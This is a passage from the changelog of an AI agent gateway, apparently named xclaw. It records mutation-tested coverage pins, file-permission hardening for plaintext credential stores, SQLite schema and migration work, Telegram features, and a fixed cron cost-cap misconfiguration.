- COVERAGE PIN (mutation sweep #69, RULE(n)xRULE(k)): the client-side
  bash timeout CEILING in `sanitizeToolArgs` (120s clamp on every bash
  dispatch through the tool router) was never exercised alone — every
  existing test case lands exactly AT 120 after the ms-to-s divide, so
  removing the ceiling left the FULL suite green (3875/0): a
  model-passed `timeout: 300` (or 300000ms) would run unclamped at this
  seam. The server-side sibling (`normalizeBashTimeoutSeconds`) is
  ceiling-covered — coverage does not transfer between the two consumers
  (defense in depth now pinned independently). Extended
  `test/bash-timeout-normalize.test.mjs`: ceiling-alone cases (300 to
  120, 300000 to 120, `_bash`-suffix names) and the negative/NaN 30s
  reset. Mutation-verified both directions. Shipping code
  byte-identical.

## 3.278.0 (2026-08-27)

- COVERAGE PIN (mutation sweep #68, RULE(n), closing the #63 carry):
  the readiness `strictQueue` opt-in — a THROWING queue store must
  unready the node when the operator asks for strictness — was pinned by
  NO test: fail-opening it left the FULL suite green (3874/0). Pinned
  both arms behaviorally (a FILE planted at `<configDir>/job-queue`
  makes queueStats throw for real): with `strictQueue: true` the node
  goes not_ready/503 with the error surfaced; by DEFAULT it stays ready
  (the resilient fail-open is deliberate and now pinned too, so a future
  "always unready on error" regression is caught from the other
  direction). Mutation-verified both ways. Shipping code byte-identical.

## 3.277.0 (2026-08-27)

- COVERAGE PIN (mutation sweep #67, RULE(n)+RULE(k)): the per-job cost
  cap predicate (`checkJobCostBudget`, default $1/job — the runaway-job
  money brake behind the loop preflight) was pinned by NO test: the
  loop-stages arm is tested with a STUBBED checker, so fail-opening the
  real comparator left the FULL suite green (3870/0) — a runaway job
  would never block on its own spend. Pinned directly: over-cap blocks
  with scope job, exactly-at-cap admits (`>` boundary), the estimate
  projects forward (spent + estimate blocks BEFORE spending), and the
  config chain (cost.perJobUsd wins, agent.maxUsdPerJob fallback,
  default $1); plus a wire pin that the loop hands the REAL predicate to
  the stub-tested arm. Mutation-verified three ways (fail-open, boundary
  over-strict, estimate dropped — each RED). Shipping code
  byte-identical.

## 3.276.0 (2026-08-27)

- COVERAGE PIN (mutation sweep #66, RULE(n)): the approval-prompt dedup
  latch (`promptedApprovals`) behind Telegram's `notifyOwnerApproval`
  had only a SOURCE pin — a regex that still matches a fail-opened
  `if (false && …has(…))`. Proven: the mutant left the FULL suite green
  (3867/0), i.e. every approval re-emission would re-prompt the owner
  (the exact v3.124.0 duplicate-prompt storm). Now pinned BEHAVIORALLY
  via the local Bot API mock: the same pending id prompts exactly once;
  a FAILED delivery does not latch (both HTML and plain fallback
  attempts must fail — the loop's re-emission then succeeds); and the
  >200 clear actually fires on the 202nd distinct prompt (bounded
  memory, old id re-prompts by design). Mutation-verified three ways
  (dedup fail-open, latch-before-delivery, clear dropped — each RED).
  Shipping code byte-identical.

## 3.275.0 (2026-08-27)

- COVERAGE PIN (mutation sweep #65, RULE(n)): the Telegram update dedup
  gate (`seenUpdateIds`) was pinned by NO test — fail-opening it left
  the FULL suite green (3864/0), meaning webhook retries and poll
  redeliveries would double-process every message (double agent runs,
  duplicate replies, double cost). Shipping code byte-identical (pure
  pin). `test/telegram-update-dedup.test.mjs` drives the exposed
  `handleUpdate` against a local Bot API mock (the documented
  `XCLAW_TELEGRAM_API_BASE` seam): a replayed update_id sends exactly
  once while a fresh id still sends; the gate registers before message
  parsing; and SEEN_MAX eviction drops the OLDEST half — a
  just-pre-trigger id stays deduped while an oldest-half id is forgotten
  by design. Mutation-verified three ways (gate fail-open, eviction
  direction flipped, eviction disabled — each RED).

## 3.274.0 (2026-08-27)

- COVERAGE PIN via pure extraction (mutation sweep #64, RULE(n)):
  Telegram's 4096 hard ceiling on operator `chunkMax` config was pinned
  by NO test — dropping the `Math.min(4096, …)` clamp left the FULL
  suite green (3860/0), meaning a config `chunkMax: 8000` would send
  over-limit bodies and Telegram would 400 every long reply live. The
  limit computation now lives in pure `resolveChunkLimits(conf)`
  (chunk-text.mjs) — ceiling clamp, `maxChunkChars` alias, 4000/12000
  defaults, and the maxReplyChars-never-below-chunkMax floor — and the
  channel factory is wired onto it (a wire pin rejects any inline
  duplicate of the clamp). Behavior identical; the chunker itself was
  already thoroughly covered. Tests:
  `test/telegram-chunk-limits.test.mjs` (mutation-verified ceiling and
  floor both directions).

## 3.273.0 (2026-08-27)

- COVERAGE PIN (mutation sweep #63, new RULE(n) quantitative caps): the
  readiness queue load-shed bound (`checkReadiness` — `ready = false`
  when `queued > maxQueued`, default 100) was pinned by NO test:
  fail-opening it left the FULL suite green (3858/0), meaning `/ready`
  would report ready forever on a drowning queue and a load balancer or
  supervisor would keep routing to it. Shipping code is byte-identical
  (the line is correct — pure pin). `test/readiness-queue-bound.test.mjs`
  drives the real `checkReadiness` against a real tmp queue dir:
  `maxQueued: -1` puts even an empty queue over the bound (not_ready /
  503) and `maxQueued: 0` sits exactly on it (`<=` admits → ready /
  200). Mutation-verified both directions — dropping the ready flip and
  tightening the `<=` mirror each redden their own subtest. Census also
  confirmed the inbound rate limiter's off-by-one boundary is already
  covered (mutant → RED, ship nothing there).

## 3.272.0 (2026-08-27)

- SECURITY HARDENING (mutation sweep #61, RULE(m) file-mode): the
  systemd secrets env file writer `writeEnvFile` (`~/.xclaw/env`,
  documented "mode 600", unconditionally plaintext because systemd reads
  K=V — the owner-only mode is the sole at-rest control) set its mode
  create-only and never re-tightened on rewrite: a write over a
  pre-existing or tampered world-readable env file left the operator's
  secrets world-readable (writeFile's `mode` is umask-masked and a no-op
  on an existing inode). Proven blind spot: `0o600 → 0o644` left the
  FULL suite green (3856/0). Fixed with the #58/#59/#60 chmod-after-
  write idiom; `test/daemon-env-file-mode.test.mjs` pins plaintext
  precondition + fresh-write mode + rewrite-repair (mutation-verified
  both directions). Census also cleared: providers/discovery.mjs and
  seats/manager.mjs hold no secrets; webauthn/cookie-rotation
  tmp-rename writers are structurally sound (fresh inode per write).

## 3.271.0 (2026-08-27)

- MEMORY VECTOR extension loader (spec §12.4 — the FINAL NeoServer spec
  item): `src/persist/vec-extension.mjs` — `tryLoadVec(db)` loads
  sqlite-vec only on a handle opened with `{ allowExtension: true }`
  (the default everywhere stays no-extensions; a plain handle refuses
  distinctly with `{ ready:false, refused:true }`). Candidates:
  `$XCLAW_SQLITE_VEC`, then `native/sqlite-vec`; success proven by
  `SELECT vec_version()`; extension loading is re-disabled after the
  attempt. Deviation verified live: node:sqlite authorizes only the
  `db.loadExtension()` method — the spec's SQL loader call stays "not
  authorized" — so the loader uses the method. Doctor probes `sql.vec`
  ONLY when `memory.vec === true` in config (absent by default — no live
  change); the memory index still stores embedding JSON and never opens
  with allowExtension. Tests: `test/vec-extension.test.mjs`
  (mutation-verified refuse-marker and re-disable both directions).

## 3.270.0 (2026-08-27)

- FIX (live incident 2026-08-27): the gateway called `startCron()` with
  NO config, so every re-hydrated cron payload job ran with `_cfg: null`
  → empty config: the cost governor enforced its no-config fallback
  ($15 hard cap) instead of the operator's $60 and PAUSED the live
  gateway's shared ledger at $15.01 (agent jobs refused; doctor showed
  the inconsistent "spent=$15.0148 limit=$60" while the job's own error
  said limit=$15); payload jobs also used default model/limits. Now
  `startCron(cfg)`. Found live: a leftover `job-alpha` cron ("ping"
  agent turn every 60s, ~$0.026/run, ~$15 today) surfaced the mismatch —
  the job was deleted (definition preserved in the ops notes) and the
  governor unpaused after verification. The $15 no-config fallback
  itself is kept as a safe default (test-pinned). Regression tests:
  `test/cron-job-cfg.test.mjs`.

## 3.269.0 (2026-08-27)

- SCHEMA RETIREMENT LIST (spec §12.2): shipped
  `src/state/schema-retirements.json` (empty lists) +
  `src/state/schema-retirements.mjs` (`listRetiredPresent`,
  `dropRetiredIfEmpty`). Doctor WARNS (`sql.retirements`) when a retired
  name is still present in the control plane; `doctor --fix`
  (`fix.retirements`) drops retired indexes and only EMPTY retired
  tables — a populated retired table is reported and kept. The open path
  never drops (test-pinned), default doctor never drops, and a guard
  test asserts no retired name ever collides with the shipping DDL (fix
  must never CREATE a retired table). With the shipped empty lists every
  path is a no-op. Tests: `test/schema-retirements.test.mjs`
  (mutation-verified emptiness-guard and type-filter both directions).

## 3.268.0 (2026-08-27)

- SQL-FIRST generated types (spec §12.3, dev-only):
  `scripts/gen-control-types.mjs` applies `control-schema.sql` to a temp
  DatabaseSync and writes `src/state/control-schema.generated.mjs`
  (table → column list, committed). Runtime stays on query-kit /
  openLocalSql — a test pins that no runtime module imports the
  generated file; another regenerates and asserts byte-identity (drift
  guard). §12.5 attachRunLoop is SKIPPED as superseded — the shipped
  §13.2/§13.3 harness is a strict superset (single-instance lock, fence,
  pendingStartup, exit-gated stop). §12.1 is inventory-only (groups are
  created when their feature ships). Tests:
  `test/gen-control-types.test.mjs` (mutation-verified drift-guard and
  column-extraction both directions).

## 3.267.0 (2026-08-27)

- DURABLE SQL starter schema (spec §12.7, final NeoServer leftover):
  shipped `src/state/control-schema.sql` (house shape — TEXT ISO, no
  STRICT; the spec's STRICT/INTEGER schema_meta would break existing
  writers on a fresh file) and `openControlPlane` now runs it on every
  open — after the base ladder (whose fresh/legacy detection relies on
  table absence, so the starter cannot run first) and before any §12.8
  group DDL. Adds `migration_runs` (same shape §12.9's helpers ensure)
  and `schema_meta.role` additively via `addColumnIfMissing` (§11.14).
  `schema_meta.version` never bumps here — that waits for a group
  migration recorded in migration_runs. `assertControlShape` is
  required-only, so the extra table never trips later opens. Tests:
  `test/control-plane.test.mjs` (mutation-verified starter-exec and
  role-add both directions).

## 3.266.0 (2026-08-27)

- GATEWAY HARNESS adoption behind a default-OFF flag (spec §13.3):
  `gateway.runLoop: true` hands lifecycle to the §13.2 run-loop —
  crash-loop backoff before boot (§13.4), single-instance lock, SIGUSR1
  same-pid in-process restart, SIGINT/SIGTERM owned by the harness,
  SIGHUP stays config-reload-only in both modes. With the flag absent
  (every existing deploy) startGateway behaves exactly as before —
  strict `=== true` check pinned by test. Harness boots return a stop
  handle; `shutdown` is exit-gated so a harness stop drains without
  killing the process. Two defects fixed en route, both live-proven on
  an isolated HOME/port: the crash guard's `clear()` now disarms the
  exit hook (a graceful stop no longer records a "crash"), and the
  run-loop keeps the single-instance lock across a restart (the spec
  sketch released it, leaving the restarted gateway unlocked — the lock
  file vanished after SIGUSR1). Supervised lifecycle proven end-to-end:
  boot → lock=pid → SIGUSR1 same-pid restart with lock intact → SIGTERM
  clean exit, lock released, no crash-history file. waitForPort stays
  unwired. Tests: `test/run-loop-adoption.test.mjs` + updated pins
  (mutation-verified lock-keep, clear-disarm, and flag gate).

## 3.265.0 (2026-08-27)

- CONVERSATION GLYPH react tool LIVE (spec §16.3): new `react` agent
  tool — the model can react to the user's current message with an emoji
  (empty clears; optional messageId targets another message). Registered
  ONLY when the inbound channel hands the loop a react-capable
  `channelContext` (telegram → processInbound → replyWithAgent →
  runAgent → loop; both tool sites); every other run never sees the
  tool. Plans through `planGlyphAction` (§16.2) so per-channel rules
  hold. Telegram adapter: `setMessageReaction` sets the whole reaction
  list (`src/channels/telegram/react.mjs` — add = one emoji,
  remove/clear = empty). Ack glyph while the agent works is wired but
  DEFAULT OFF (`channels.telegram.ackReaction` unset → no-op; falls back
  identity glyph → `eyes` when on). Errors return `ok:false`, never
  throw into the loop. Tests: `test/react-tool.test.mjs` +
  updated wiring pin in `test/conversation-glyph.test.mjs`
  (mutation-verified telegram payload and registry gate both
  directions).

## 3.264.1 (2026-08-27)

- TEST FIX: `test/crash-guard.test.mjs` used a session-local scratch
  path that does not exist on the CI runner, failing all three crash
  guard tests on both Node matrices (3.264.0's `ci` workflow was red;
  the other three workflows were green). Now uses `os.tmpdir()`. No
  source changes.

## 3.264.0 (2026-08-27)

- GATEWAY HARNESS companions (spec §13.4 + §13.5):
  `src/gateway/crash-guard.mjs` — `applyCrashLoopGuard` (every process
  exit records a timestamp into `gateway-crash-history.json`; boots
  inside a 15-minute window back off 0 / 30s at 4 / 5m at 7 and refuse
  `XCLAW_CRASH_LOOP` at 10; `clear()` after a successful start so
  intentional restarts do not count) and `waitForPort` (poll a TCP
  connect every 200ms until the deadline). Exit-hook recording is proven
  in a real child process. NOT adopted by the live gateway — companions
  to the (also unadopted) §13.2 run-loop; a test pins the absence.
  Tests: `test/crash-guard.test.mjs` (mutation-verified refuse-threshold
  and exit-recording both directions).

## 3.263.0 (2026-08-27)

- GATEWAY RUN-LOOP harness module (spec §13.2):
  `src/gateway/run-loop.mjs` — `acquireGatewayLock` single-instance file
  lock under `<stateDir>/tmp/gateway-<port>.lock` (stale-pid reap,
  live-foreign-pid refuse `XCLAW_GATEWAY_LOCKED`, same-pid re-acquire),
  `runGatewayLoop` (SIGINT/SIGTERM stop, SIGUSR1 in-process restart in
  the same pid, second-signal fence, hard-exit watchdog at drainMs + 2s
  exit 1), `drainProcessStores` (cron → control plane → agent stores —
  the agent-store close is a house addition per §12.6's close-on-stop
  rule). Shutdown order stop → drain SQL → release lock is test-pinned.
  NOT adopted by the live gateway — startGateway still owns its signals
  (spec §13.3 adoption is a separate live-surface slice; a test pins
  that gateway/index.mjs does not import the harness). Tests:
  `test/run-loop.test.mjs` (real-signal restart/stop/fence on a fake
  server; mutation-verified fence-latch and lock-refuse both directions).

## 3.262.0 (2026-08-27)

- DURABLE SQL audit migration runner (spec §12.9):
  `src/persist/migration-runs.mjs` — `ensureMigrationRuns`,
  `runNamedMigration` (the migration body and its ok audit row commit in
  ONE `kit.atomic`; a failing body rolls back and leaves a permanent
  error row with the message, then rethrows), `listMigrationHistory`
  ordered by started_at. Rows are never deleted — no delete helper, and
  a test pins no DELETE statement in the module. Self-contained on any
  kit (control-plane or per-agent); openControlPlane untouched (§12.7
  starter schema is separate). §12.8 CONTROL_GROUPS skipped — it names
  §12.1 catalog tables that do not exist in this schema. House TEXT ISO
  timestamps (documented deviation from the spec's INTEGER ms + STRICT).
  Tests: `test/migration-runs.test.mjs` (mutation-verified atomic-wrap
  and error-row both directions).

## 3.261.0 (2026-08-27)

- DURABLE SQL per-agent VFS / artifacts / boards tables (spec §12.6):
  `agent_vfs_nodes` (BLOB bytes), `agent_artifacts`, `agent_boards`,
  `agent_board_columns`, `agent_board_cards`, `agent_transcript_archive`,
  `agent_heartbeat_outcomes` on the per-agent file (NOT the control
  plane). Additive `CREATE IF NOT EXISTS` — an existing agent file gains
  the tables on reopen with data preserved; `AGENT_SCHEMA_VERSION` stays
  1. House DDL style (TEXT ISO timestamps, no STRICT — same documented
  deviation as the schema marker). No live wiring; gateway start still
  does not open a per-agent file. Tests: `test/agent-store.test.mjs`
  (mutation-verified table-group and BLOB-column both directions).

## 3.260.0 (2026-08-27)

- CONVERSATION GLYPHS pure modules (spec §16.2 + §16.4):
  `src/channels/conversation-glyph.mjs` (`normalizeGlyph`,
  `planGlyphAction` per-channel add/remove/clear rules, `resolveAckGlyph`
  configured → identity → `eyes` fallback, `applyConversationGlyph`
  fail-closed on a bad plan or a missing `react` adapter) and
  `src/cli/decorate-line.mjs` (`emojiTtyOk` UTF-8-TTY gate,
  `decorateLine`, `stripLineGlyphs`). NOT wired to the live message tool
  (spec §16.3 is a separate slice — a test pins the absence). Inbound
  Telegram emoji handling and TTS glyph stripping unchanged. Tests:
  `test/conversation-glyph.test.mjs` + `test/decorate-line.test.mjs`
  (mutation-verified whatsapp-replace and locale-refuse both directions).

## 3.259.0 (2026-08-27)

- DURABLE SQL agent schema version marker (spec §12.10):
  `AGENT_SCHEMA_VERSION` (1) + `schema_meta` table in the per-agent file.
  `openAgentStore` upserts the marker in one `kit.atomic` — a reopen only
  touches `touched_at`, a stored version is never bumped in place, and a
  NEWER stored version refuses the open fail-closed (mirrors the
  control-plane gate; extra vs the spec's bare upsert). A version refuse
  does not quarantine. `schema_meta` shape matches the control plane
  (TEXT ISO `touched_at`, no STRICT — house style over the spec sketch).
  Tests: `test/agent-store.test.mjs` (mutation-verified refuse-newer and
  marker-write both directions).

## 3.258.0 (2026-08-27)

- DURABLE SQL per-agent file (spec §11.13): `agentStoreFile` /
  `openAgentStore` / `getAgentStore` / `stopAgentStores` in
  `src/state/agent-store.mjs`. Path is `cfg.paths.agentDir` or
  `~/.xclaw/agents/<id>/agent.sqlite`. Same DDL as `transcript_events` +
  `session_heads`. Cache is a Map keyed by agent id; gateway stop walks
  the cache and `kit.close()` each handle next to `stopControlPlane`.
  Gateway start does not open a per-agent file. Control plane stays
  global. Does not bump `CONTROL_SCHEMA_VERSION`, does not absorb
  pairing.json, and does not move live transcripts. Tests:
  `test/agent-store.test.mjs` (mutation-verified cache-hit and close-on-stop
  both directions).

## 3.257.0 (2026-08-27)

- DURABLE SQL task run helpers (spec §11.23): `startTask` and `finishTask` in
  `src/state/control-plane.mjs` sit on an open kit. Start INSERT `running`;
  finish SELECT+merge extra onto stored payload JSON + UPDATE status /
  finished_at is one `kit.atomic` so two callers cannot clobber the merge.
  Not wired to the live runner. Does not bump `CONTROL_SCHEMA_VERSION` and
  does not absorb pairing.json. Tests: `test/control-plane.test.mjs`
  (mutation-verified atomic wrap and payload merge both directions).

## 3.256.0 (2026-08-27)

- DURABLE SQL delivery queue helpers (spec §11.22): `enqueueDelivery`,
  `takeDelivery`, and `finishDelivery` in `src/state/control-plane.mjs` sit
  on an open kit. Enqueue inserts `pending`; take SELECT+UPDATE is one
  `kit.atomic` so two callers cannot claim the same row; finish defaults
  to `done`. Not wired to live WS/telegram outbound. Does not bump
  `CONTROL_SCHEMA_VERSION` and does not absorb pairing.json. Tests:
  `test/control-plane.test.mjs` (mutation-verified atomic wrap and inflight
  UPDATE both directions).

## 3.255.0 (2026-08-27)

- DURABLE SQL first-open exclusive lock (spec §11.24):
  `openControlPlaneExclusive(cfg)` in `src/state/control-plane.mjs` takes the
  same coordinator as cron import (`tryTakeExclusiveLock`) when
  `control.sqlite` is missing, then drops it before the kit open — BEGIN
  EXCLUSIVE on the coordinator handle would otherwise block a second
  `DatabaseSync`. After the file exists, later opens skip the lock.
  `getControlPlane` and `doctor --fix` use the exclusive first-open. Does
  not bump `CONTROL_SCHEMA_VERSION` and does not absorb pairing.json.
  Tests: `test/control-plane.test.mjs` (mutation-verified skip-if-exists and
  drop-before-open both directions).

## 3.254.0 (2026-08-27)

- DURABLE SQL sync query-builder dialect (spec §11.9): `createSyncDialect(file)`
  in `src/persist/sync-dialect.mjs` sits on `openLocalSql`. SELECT / PRAGMA /
  WITH return `{ rows }`; other statements return `{ rows: [], numAffectedRows }`.
  `release()` does not close the handle; `destroy()` does. Does not import
  `node:sqlite`. Does not bump `CONTROL_SCHEMA_VERSION` and is not opened from
  the gateway. Tests: `test/sync-dialect.test.mjs` (mutation-verified WITH
  row-path and destroy-closes both directions).

## 3.253.0 (2026-08-27)

- DURABLE SQL additive columns (spec §11.14): `addColumnIfMissing(db, table,
  column, decl)` in `src/persist/add-column.mjs` runs `PRAGMA table_info` then
  `ALTER TABLE … ADD COLUMN` only when the name is absent. Never rebuilds a
  populated table. This binary does not bump `CONTROL_SCHEMA_VERSION` (v2
  already means the extra table group) and does not add `devices.last_seen` on
  open. Callers stamp `schema_meta` in the same `runAtomic` as the add.
  Tests: `test/add-column.test.mjs` (mutation-verified add-missing and
  idempotent-skip both directions).

## 3.252.0 (2026-08-27)

- DURABLE SQL extra control-plane tables (spec §11.7): `CONTROL_SCHEMA_VERSION`
  is 2. Fresh `control.sqlite` creates `state_leases`, `operator_approvals`,
  `plugin_state`, `plugin_blobs`, `audit_events`, and `session_heads` next to
  the v1 pairing group. A v1 file migrates in place (`CREATE TABLE IF NOT
  EXISTS` only, then stamp version 2 in the same `runAtomic`). Never DROP a
  populated table to "fix" a mismatch — incomplete v1 stays at version 1 and
  refuses; incomplete v2 refuses and does not recreate. Unknown older versions
  still refuse `XCLAW_SCHEMA_OLDER`. Does not absorb pairing/seats/plugin JSON.
  Tests: `test/control-plane.test.mjs` (mutation-verified v1→v2 migrate and
  incomplete-v1 no-bump both directions).

## 3.251.0 (2026-08-27)

- HOST runtime Bun gate (spec §11.1): `describeRuntime()` sits next to
  `describeHost()` in `src/runtime/host-compat.mjs`. If `process.versions.bun`
  is set, require Bun `>= 1.4.0`, `node:sqlite` present, and the same SQLite
  WAL-reset window. CLI boot and `init` refuse via `runtimeCompatBanner` when
  kind is bun and not allowed. Doctor reports `bun` (not "Node unsupported")
  on a Bun host and keeps `node` on Node. Node remains the ship default; no
  Bun path in Docker/CI. Tests: `test/host-compat.test.mjs` (mutation-verified
  bun floor and WAL-window both directions).

## 3.250.0 (2026-08-27)

- DURABLE SQL corruption recovery (spec §11.18 + §11.17): new
  `src/persist/sql-quarantine.mjs` copies a corrupt control or memory file
  plus `-wal`/`-shm` to `file.corrupt.<stamp>` and leaves the original.
  `openControlPlane` / `openMemoryIndex` quarantine on `isSqlCorruptionError`
  then refuse; schema refuse is not corruption and does not copy.
  `getControlPlane` latches the corruption error so a later get does not
  loop-reopen. Doctor probes `sql.control` and `sql.memory` (missing = info,
  lock = warn busy, corrupt = error) and does not quarantine; default doctor
  stays read-only. Tests: `test/sql-quarantine.test.mjs` (mutation-verified
  quarantine-on-open and no-loop-reopen latch both directions).

## 3.249.0 (2026-08-27)

- DURABLE SQL memory search index (spec §11.5 + §11.8): new
  `src/memory/search-index.mjs` opens `~/.xclaw/memory/main.sqlite` through
  the query kit (separate from `control.sqlite`). Creates `meta` / `files` /
  `chunks` / `embed_cache` and, when FTS5 is available, `chunks_fts`.
  `searchMemory` MATCH+rank with LIKE fallback; `upsertChunk` replaces the
  FTS row so an update does not duplicate hits. Vector extension is not
  loaded. Not opened from the gateway — recall still reads `events.jsonl`.
  Tests: `test/memory-search-index.test.mjs` (mutation-verified FTS replace
  and LIKE fallback both directions).

## 3.248.0 (2026-08-26)

- DURABLE SQL doctor --fix (spec §11.6 + §11.10): leftover `cron-jobs.json`
  is folded through `normalizeLegacyJob` (`jobId`→`id`, `cron`/`schedule.cron`
  → `{kind:"cron"}`, `intervalMs`→`schedule.everyMs`, `threadId`→`delivery`)
  then absorbed into `jobs.sqlite`; leftover `pairing.json` is absorbed into
  `control.sqlite` via the existing `absorbPairingJson`. Both rename the
  source to `.bak` only if moved > 0. Default `xclaw doctor` (and the
  scheduled cron doctor) stay read-only — `--fix` is the only opt-in path.
  Does not rewrite `xclaw.json`. Tests: `test/normalize-legacy-job.test.mjs`,
  `test/doctor-fix.test.mjs` (mutation-verified absorb-normalize and the
  `--fix` gate both directions).

## 3.247.0 (2026-08-26)

- DURABLE SQL control plane (spec §11.4 pairing-only + §11.11 + §11.16): new
  `src/state/control-plane.mjs` opens `~/.xclaw/state/control.sqlite` through
  the query kit, stamps `schema_meta` at v1, refuses a newer version ("upgrade
  the gateway binary") and refuses a v1 file missing a stable table (does not
  CREATE it as if new). `absorbPairingJson` copies `pairing.json`
  pending→`pair_pending` and approved→`pair_done` then renames the source to
  `.bak` — same shape as cron JSON absorb, and is NOT run from open, so live
  telegram/discord keep reading `createPairingStore`. Gateway caches one handle
  (`getControlPlane` after `startCron`, `stopControlPlane` next to `stopCron`).
  Tests: `test/control-plane.test.mjs` (mutation-verified refuse-newer and
  absorb-rename both directions).

## 3.246.0 (2026-08-26)

- DURABLE SQL doorway (spec §11.2 + §11.3): `loadBuiltinSql()` now arms a
  one-shot notice filter before `require("node:sqlite")` so the builtin
  ExperimentalWarning is swallowed and every other warning still reaches
  stderr / previously-registered listeners. New `src/persist/query-kit.mjs`
  is the single-handle kit later stores sit on (`openLocalSql` + WAL keeper +
  `runAtomic`) — no second driver, no new npm package. Tests:
  `test/notice-filter.test.mjs`, `test/query-kit.test.mjs`.

## 3.245.0 (2026-08-26)

- SECURITY (hardening + coverage, RULE(m) — mutation sweep #60): the pending-PKCE
  store `<configDir>/oauth-pending.json` (src/connected/oauth-pending.mjs) holds
  the OAuth `code_verifier` in cleartext — there is no encryption path, so its
  owner-only file mode is the sole at-rest control on the PKCE secret. Both
  writers set the mode create-only and never re-`chmod`'d: `createPending` passed
  `{ mode: 0o600 }` (honoured only when the file is first created) and
  `takePending` rewrote the file with no mode at all. Because the store persists
  across concurrent in-flight logins, every write after the first is an in-place
  rewrite of an existing inode — so a store that was ever created at a looser mode
  (older build, restore, umask) stayed group/other-readable forever, leaving the
  PKCE verifier world-readable. The mode was asserted by no test (the authenticator
  tests pin accept-once / reject-forged / single-use / reject-expired, not the
  mode — seeding the store at 0o644 then writing left the suite green: a blind
  spot). Per the sweep #58/#59 pattern both writers now `chmod(fp, 0o600)` after
  writing, so the 0o600 invariant holds on every rewrite regardless of the file's
  prior mode; new `test/oauth-pending-file-mode.test.mjs` pins it (mutation-verified
  both directions: create-rewrite and take-rewrite each go RED without their chmod).

## 3.244.0 (2026-08-26)

- HOST RUNTIME: startup, installers, `daemon start`, and `init` now enforce a
  two-gate host policy. Gate A allows only Node `>=22.22.3 <23 || >=24.15.0 <25
  || >=25.9.0` (23.x, a short-lived Current line, is refused); Gate B requires
  the loaded `node:sqlite` library to clear the WAL-reset window (SQLite ≥ 3.51.3,
  or ≥ 3.50.7 on 3.50.x, or ≥ 3.44.6 on 3.44.x), so a distro Node linked against
  an old system libsqlite3 is refused with an explicit banner instead of silently
  corrupting a WAL database.
- DURABLE CRON: the cron store moves from `~/.xclaw/cron-jobs.json` to
  `~/.xclaw/cron/jobs.sqlite` (durable `node:sqlite`, WAL journal keeper +
  atomic writes behind a single doorway). A legacy `cron-jobs.json` is imported
  once on first start and renamed `.bak`; handler-backed jobs stay memory-only.
- DOCTOR: `xclaw doctor` now reports the host band, the probed Node + SQLite
  versions, `node:sqlite` load + FTS5 availability, and the cron ledger's
  `integrity_check` with a persisted-job count.

## 3.243.0 (2026-08-26)

- SECURITY (hardening + coverage, RULE(m) — mutation sweep #59): the xAI *OAuth*
  token vault (`<configDir>/auth.json`) — written by every device-code, PKCE-
  loopback, refresh, and Grok-CLI-import flow via `writeTokens`
  (src/auth/xai-oauth.mjs) — is stored in PLAINTEXT (no encryption path, like its
  API-key sibling src/auth/xai.mjs), so its owner-only file mode is the *sole*
  barrier between a local non-root user and a live provider bearer + refresh
  credential. Unlike that sibling, `writeTokens` set `mode: 0o600` only at
  *create* time and never re-`chmod`'d — so a refresh rewrite over a pre-existing
  or tampered world-readable `auth.json` left it readable, and the mode was
  asserted by no test (flipping the create-time mode to `0o644` left the whole
  suite green, 3715/0 — a blind spot). Per RULE(m) a per-file PERMISSION MODE is
  its own enforcement line, and the `chmod` (not the umask-masked create-time
  `writeFile` mode, a no-op on an existing file) is what guarantees the mode on
  every rewrite. This release brings `writeTokens` to exact `saveCredentials`
  parity — `fs.chmod(tokenPath, 0o600)` after the write — and adds
  `test/xai-oauth-file-mode.test.mjs`, which pins `0o600` on the initial write and
  on a rewrite after the file was left group/world-readable (which only the chmod
  can repair), and asserts the plaintext-at-rest precondition that makes the mode
  load-bearing. Mutation-verified both directions on the authoritative chmod
  (correct code GREEN 2/2; `0o644` mutant RED 2/2). Suite 3715 → 3717.

## 3.242.0 (2026-08-26)

- SECURITY (coverage pin, RULE(m) — mutation sweep #58): the live xAI credential
  store (`<configDir>/credentials.json`) is written by `saveCredentials`
  (src/auth/xai.mjs) with `mode: 0o600` and re-asserted by a following
  `fs.chmod(fp, 0o600)`. Unlike the token vault / connected-token store, this
  module has NO encryption path at all — the xAI API key and any OAuth
  access/refresh tokens are persisted as plain `JSON.stringify(data)`, so the
  credential always sits on disk in PLAINTEXT and that owner-only file mode is the
  *sole* barrier between a local non-root user and a bearer credential for the
  gateway's model provider. Yet the mode was asserted by no test: flipping the
  authoritative `chmod` line to `0o644` (world-readable) left the entire suite
  green (3713/0) — a blind spot. Per RULE(m), a per-file PERMISSION MODE is its
  own enforcement line, and the `chmod` (not the create-time `writeFile` mode,
  which is umask-masked and a no-op on an existing file) is what guarantees the
  mode on every rewrite. Shipping code is UNCHANGED (`xai.mjs` sha256 identical);
  this release adds `test/xai-credentials-file-mode.test.mjs`, which pins `0o600`
  on the initial write and on a rewrite after the file was left group/world-
  readable (which only the chmod can repair), and asserts the plaintext-at-rest
  precondition that makes the mode load-bearing. Mutation-verified both directions
  (correct code GREEN 2/2; `0o644` mutant RED 2/2). Suite 3713 → 3715.

## 3.241.0 (2026-08-26)

- SECURITY (coverage pin, RULE(m) — mutation sweep #57): the gateway's EC P-256
  *private* signing-key store (`<configDir>/key-rotation.json`) is written
  `mode: 0o600` in `writeStore` (src/auth/key-rotation.mjs). When no key secret
  is configured (`auth.keys.secret` / `XCLAW_KEY_SECRET` — the default) the
  private JWK is stored in PLAINTEXT (`privateBlob.enc === false`), so that
  owner-only file mode is the *sole* barrier between a local non-root user and a
  key that forges any gateway JWT. Yet the mode was asserted by no test: flipping
  the shipping line to `0o644` (world-readable) left the entire suite green
  (3711/0) — a blind spot. Per RULE(m), a per-file PERMISSION MODE is its own
  enforcement line; a test that only checks the file exists does not cover its
  mode. Shipping code is UNCHANGED (`key-rotation.mjs` sha256 identical); this
  release adds `test/key-store-file-mode.test.mjs`, which pins `0o600` on both
  the initial `ensureKeyStore` write and across a `rotateKeys` rewrite, and
  asserts the plaintext-by-default precondition that makes the mode load-bearing.
  Mutation-verified both directions (correct code GREEN 2/2; `0o644` mutant RED
  2/2). Suite 3711 → 3713.

## 3.240.0 (2026-08-26)

- FEATURE: Tailscale exposure for the gateway. A loopback gateway can now be
  fronted by a stable HTTPS route without opening a router port or standing up a
  reverse proxy — `serve` (private to your tailnet) or `funnel` (public on the
  internet; ports 443/8443/10000 only). New `src/net/tailscale.mjs` drives the
  `tailscale` CLI directly (`spawnSync` with an argument array and NO shell — no
  command-injection surface; no new dependency), degrading non-fatally
  everywhere: host resolution, whois, and route setup return null / an inactive
  handle and log, so a Tailscale hiccup can never take the gateway down.
- Config: `gateway.bind` (`loopback|auto|lan|tailnet|custom`; default `custom`
